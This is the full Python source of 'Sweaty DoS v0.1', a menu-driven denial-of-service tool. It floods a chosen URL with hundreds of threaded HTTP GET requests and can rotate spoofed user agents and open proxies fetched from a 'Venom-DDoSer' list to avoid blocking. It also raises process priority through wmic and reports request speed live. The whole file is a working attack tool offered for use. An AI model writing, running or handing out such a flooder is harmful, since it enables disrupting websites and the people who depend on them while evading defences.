# Sweaty DoS version 0.1

from sys import platform
from os import system, listdir

version = "0.1"
if platform == "win32":
    command = "cls"
elif platform == "linux":
    command = "clear"
else:
    command = ""

print("Loading libraries", end="")
print(".", end="")
from time import sleep
print(".", end="")
from threading import Thread
print(".", end=" ")
from random import choice
from subprocess import check_output
print("Done")
ans = None
try:
    from requests import get, exceptions
except:
    ans = input("You do not have the required libraries installed. Set to continue (Y/n): ").upper()
    if ans == "Y":
        system("pip install requests")
        from requests import get
    else:
        exit(0)
try:
    from keyboard import is_pressed
except:
    if ans is None:
        ans = input("You do not have the required libraries installed. Set to continue (Y/n): ").upper()
    if ans == "Y":
        system("pip install keyboard")
        from keyboard import is_pressed
    else:
        exit(0)

print("Loading functions and variables", end="")

def Attack(url, delay):
    global speed
    headers = {}
    proxies = {}
    if enable[0]:
        headers = {
            "User-Agent": UserAgent().random
        }
    if enable[1]:
        proxies = {
            "http": f"http://{choice(proxy_list)}"
        }
    while attack:
        try:
            sleep(delay)
            speed = speed + 1
            get(url, headers=headers, proxies=proxies, timeout=0.01)
        except:
            pass

print(".", end="")

enable = [False, False]
speed = 0
proxy_list = []
translator = {True: "Enabled", False: "Disabled"}
attack = False

print(".", end="")

def Send(proxy, timeout):
    global proxy_list
    try:
        get("http://google.com/", proxies={"http": f"http://{proxy}"}, timeout=timeout)
    except:
        pass
    else:
        proxy_list.append(proxy)

print(".", end="")

maindir = listdir()
if "http.txt" not in maindir:
    open("http.txt", "w").close()

def Start():
    global speed
    if enable[1]:
        ans = input("Update proxy list (Y/n): ").upper()
        if ans == "Y":
            while True:
                try:
                    timeout = float(input("Set the delay. To disable the delay, enter \"0\" (second): "))
                except ValueError:
                    print("Please enter a number to continue.")
                else:
                    break
            if timeout == 0:
                timeout = None
            for i in get("https://raw.githubusercontent.com/apnem19/Venom-DDoSer/main/http.txt").text.split("\n"):
                Thread(target=Send, args=[i, timeout]).start()
            if len(proxy_list):
                print(f"Found {len(proxy_list)} proxy servers.")
                file = open("http.txt", "w")
                file.write("\n".join(proxy_list))
                file.close()
            else:
                input(f"No proxy servers found. You can try to find proxy servers yourself and write them to the \"http.txt\" file, separating them with a new line.")
                return
        elif ans == "N" and open("http.txt", "r").read().split("\n") == [""]:
            input("Disable the \"use proxy\" function in the settings to continue.")
            return
    while True:
        url = input("\nEnter URL (enter 0, to back): ")
        if url == "0":
            return
        try:
            get(url)
        except exceptions.MissingSchema:
            print("Invalid URL. Please enter valid URL to continue.")
        except:
            break
        else:
            break
    while True:
        try:
            strength = int(input("Choose strength (1-easy; 2-normal; 3-hard): "))
        except ValueError:
            print("Please enter a number to continue.")
        else:
            break

    print("Running DoS-attack")

    if strength == 2:
        delay = 0.25
        check_output("wmic process where name=\"python.exe\" CALL setpriority 32768")
    elif strength == 3:
        delay = 0
        check_output("wmic process where name=\"python.exe\" CALL setpriority 128")
    else:
        delay = 0.5

    for i in range(300 * strength):
        Thread(target=Attack, args=[url, delay]).start()

    while True:
        system(command)
        print(f"Speed: {speed}/sek\nPress \"enter\" to return")
        speed = 0
        if is_pressed("enter"):
            system(command)
            break
        sleep(1)

print("Done")

while True:
    system(command)
    print("""██████╗░░█████╗░░██████╗  ░██████╗░█████╗░██████╗░██╗██████╗░████████╗
██╔══██╗██╔══██╗██╔════╝  ██╔════╝██╔══██╗██╔══██╗██║██╔══██╗╚══██╔══╝
██║░░██║██║░░██║╚█████╗░  ╚█████╗░██║░░╚═╝██████╔╝██║██████╔╝░░░██║░░░
██║░░██║██║░░██║░╚═══██╗  ░╚═══██╗██║░░██╗██╔══██╗██║██╔═══╝░░░░██║░░░
██████╔╝╚█████╔╝██████╔╝  ██████╔╝╚█████╔╝██║░░██║██║██║░░░░░░░░██║░░░
╚═════╝░░╚════╝░╚═════╝░  ╚═════╝░░╚════╝░╚═╝░░╚═╝╚═╝╚═╝░░░░░░░░╚═╝░░░\t\tv0.1
    """)
    ans = input("1. Start\n2. Settings\n0. Exit\n")
    if ans == "0":
        exit(0)
    elif ans == "1":
        attack = True
        Start()
        attack = False
    elif ans == "2":
        while True:
            system(command)
            ans = input(f"   Settings\n1. About the author\n2. Use proxy ({translator[enable[1]]})\n3. Change headers ({translator[enable[0]]})\n4. Check for updates\n0. Back\n")
            if ans == "0":
                break
            elif ans == "1":
                input("\nCreator: Sweaty Man\nGithub profile: https://github.com/SweatyMan\nYoutube channel: https://www.youtube.com/channel/UCkAldFCFSeFz1h61lHv4t6Q\nPress \"enter\" to continue")
            elif ans == "2":
                if enable[1]:
                    enable[1] = False
                else:
                    enable[1] = True
            elif ans == "3":
                if enable[0]:
                    enable[0] = False
                else:
                    try:
                        from fake_useragent import UserAgent
                    except:
                        if input("You do not have the required libraries installed. Set to continue (Y/n): ").upper() == "Y":
                            system("pip install fake_useragent")
                            from fake_useragent import UserAgent
                        else:
                            break
                    enable[0] = True
            elif ans == "4":
                update = get("https://raw.githubusercontent.com/SweatyMan/DoS-Script/main/version.txt").text[:-1]
                if update.split(".")[0] > version.split(".")[0]:
                    input(f"Global update {update} available (your version is {version})")
                elif update.split(".")[1] > version.split(".")[1]:
                    input(f"Update {update} available (your version is {version})")
                else:
                    input(f"No new updates (your version is {version})")

